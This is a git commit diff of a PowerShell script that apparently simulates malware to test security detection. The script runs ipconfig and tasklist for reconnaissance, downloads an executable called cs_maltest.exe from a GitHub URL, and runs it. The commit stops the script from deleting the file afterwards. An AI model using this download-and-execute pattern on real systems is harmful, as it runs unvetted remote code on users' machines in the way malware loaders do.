e14576e0079d148efccf35fff46315ee0f79db66
scriptsample <44967435+scriptsample@users.noreply.github.com>
2019-06-25 12:24:39 +0900

    Update cs-test.ps1

--- cs-test.ps1
+++ cs-test.ps1
@@ -1,8 +1,7 @@
-cd $env:temp
+cd $env:USERPROFILE
 ipconfig /all | Out-Null
 tasklist | Out-Null
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
-(New-Object System.Net.WebClient).DownloadFile('https://github.com/macigaiga/cstest/raw/master/cs_maltest.exe', "$env:temp"+'/cs_maltest.exe')
+(New-Object System.Net.WebClient).DownloadFile('https://github.com/macigaiga/cstest/raw/master/cs_maltest.exe', "$env:USERPROFILE"+'/Desktop/cs_maltest.exe')
 .\cs_maltest.exe
 Start-Sleep -s 10
-Remove-Item cs_maltest.exe
